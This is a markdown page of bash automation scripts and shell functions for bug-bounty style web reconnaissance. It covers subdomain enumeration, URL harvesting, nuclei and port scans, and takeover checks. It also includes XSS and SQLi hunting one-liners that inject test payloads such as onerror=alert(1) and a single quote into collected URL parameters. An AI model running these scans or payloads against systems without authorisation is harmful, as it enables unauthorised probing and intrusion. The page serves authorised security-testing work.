[← Back to README](../Readme.md)

---

## 🤖 Automation Scripts

### Full Recon Pipeline
```bash
#!/bin/bash
domain=$1
mkdir -p $domain && cd $domain

# Subdomains
subfinder -d $domain -all -silent | anew subs.txt
amass enum -passive -d $domain | anew subs.txt
assetfinder -subs-only $domain | anew subs.txt

# Alive check
cat subs.txt | httpx -silent -threads 100 | anew alive.txt

# URLs
cat alive.txt | katana -d 5 -jc -silent | anew urls.txt
cat alive.txt | waybackurls | anew urls.txt
cat alive.txt | gau --threads 50 | anew urls.txt

# Vulnerability patterns
cat urls.txt | gf xss | anew xss.txt
cat urls.txt | gf sqli | anew sqli.txt
cat urls.txt | gf ssrf | anew ssrf.txt
cat urls.txt | gf lfi | anew lfi.txt

# Nuclei scan
nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high -o vulns.txt
```

### XSS Hunter Script
```bash
#!/bin/bash
target=$1
echo $target | waybackurls | anew urls.txt
echo $target | gau | anew urls.txt
cat urls.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1)>' | airixss -payload "alert(1)" | tee xss_found.txt
cat urls.txt | gf xss | uro | dalfox pipe --silence | tee -a xss_found.txt
```

### API Recon Script
```bash
#!/bin/bash
target=$1
mkdir -p $target/api && cd $target/api

# Find API endpoints
cat ../alive.txt | httpx -silent -path /api,/api/v1,/api/v2,/swagger.json,/openapi.json | anew api_endpoints.txt

# Extract from JS
cat ../js.txt | xargs -I@ curl -s @ | grep -oE "(/api/[^\"\'\`\s\<\>]+)" | sort -u | anew js_api_endpoints.txt

# Test GraphQL
cat ../alive.txt | httpx -silent -path /graphql,/graphiql,/playground -mc 200 | anew graphql.txt

echo "[+] API recon complete!"
```

---

## ⚙️ Bash Functions

Add to your `.bashrc` or `.zshrc`:

```bash
# Quick recon
recon() {
    subfinder -d $1 -silent | anew subs.txt
    assetfinder -subs-only $1 | anew subs.txt
    cat subs.txt | httpx -silent | anew alive.txt
    echo "[+] Found $(wc -l < alive.txt) alive hosts"
}

# XSS scan
xscan() {
    echo $1 | waybackurls | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
}

# SQLi scan
sqscan() {
    echo $1 | waybackurls | gf sqli | uro | qsreplace "'" | httpx -silent -ms "error|syntax|mysql"
}

# JS recon
jsrecon() {
    echo $1 | waybackurls | grep -iE "\.js$" | httpx -silent | nuclei -t exposures/
}

# Nuclei quick
nuke() {
    echo $1 | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high
}

# Full pipeline
fullrecon() {
    recon $1
    cat alive.txt | katana -d 3 -jc -silent | anew urls.txt
    cat urls.txt | gf xss | anew xss.txt
    cat urls.txt | gf sqli | anew sqli.txt
    nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high -o vulns.txt
}

# Certificate search
cert() {
    curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
}

# Parameter extraction
params() {
    echo $1 | waybackurls | grep "=" | uro | unfurl keys | sort -u
}

# Subdomain takeover check
takeover() {
    subfinder -d $1 -silent | httpx -silent | nuclei -t takeovers/ -c 50
}

# Port scan
portscan() {
    naabu -host $1 -top-ports 1000 -silent | httpx -silent | anew $1_ports.txt
}

# Screenshot all
screenshot() {
    cat $1 | xargs -I@ gowitness single @ -o screenshots/
}
```

---

[← Back to README](../Readme.md)
